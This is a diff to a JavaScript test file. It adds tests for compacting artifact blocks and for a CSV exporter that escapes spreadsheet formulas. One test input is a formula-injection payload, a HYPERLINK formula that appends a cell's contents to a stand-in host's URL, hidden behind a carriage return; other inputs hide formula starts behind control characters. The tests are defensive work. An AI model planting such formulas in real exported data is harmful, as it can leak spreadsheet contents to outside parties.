@@ -76,6 +76,13 @@ describe("artifact blocks", () => {
     assert.equal(parseArtifact("chart", "{not json"), null)
     assert.equal(parseArtifact("video", "{}"), null)
   })
+
+  it("compacts blocks with a custom note when given one", () => {
+    const table = artifactBlock("table", { columns: [{ key: "a", label: "A", format: "text" }], rows: [{ a: "x" }] })
+    const chart = artifactBlock("chart", { ...EXAMPLE_GRAPH, title: "Growth" })
+    assert.equal(compactArtifacts(`a${table}b`).replace(/\s+/g, " "), "a [Table shown to the user] b")
+    assert.equal(compactArtifacts(`a${chart}${table}`, (kind, title) => `<${kind}|${title ?? "-"}>`).replace(/\s+/g, ""), "a<chart|Growth><table|->")
+  })
 })
 
 describe("toCsv", () => {
@@ -84,5 +91,16 @@ describe("toCsv", () => {
       toCsv(["Name", "Amount"], [["Rent, June", -1400], ["=HYPERLINK()", null], ['Say "hi"', 3]]),
       'Name,Amount\r\n"Rent, June",-1400\r\n\'=HYPERLINK(),\r\n"Say ""hi""",3\r\n'
     )
+  })
+
+  it("neutralizes formulas behind a carriage return or other control characters", () => {
+    assert.equal(toCsv(["a"], [['\r=HYPERLINK("https://e.test/?"&B2,"Details")']]), 'a\r\n"\'=HYPERLINK(""https://e.test/?""&B2,""Details"")"\r\n')
+    assert.equal(toCsv(["a"], [["\u0000\u001b=1+1"]]), "a\r\n'=1+1\r\n")
+    // A carriage return inside the text is dropped; the line break that matters stays.
+    assert.equal(toCsv(["a"], [["one\r\ntwo"]]), 'a\r\n"one\ntwo"\r\n')
+  })
+
+  it("still prefixes every formula start and leaves numbers and plain text alone", () => {
+    assert.equal(toCsv(["=1+1", "-5", "@x", "\tx", "+1"], [[-5, "plain", "", 0, null]]), "'=1+1,'-5,'@x,'\tx,'+1\r\n-5,plain,,0,\r\n")
   })
 })
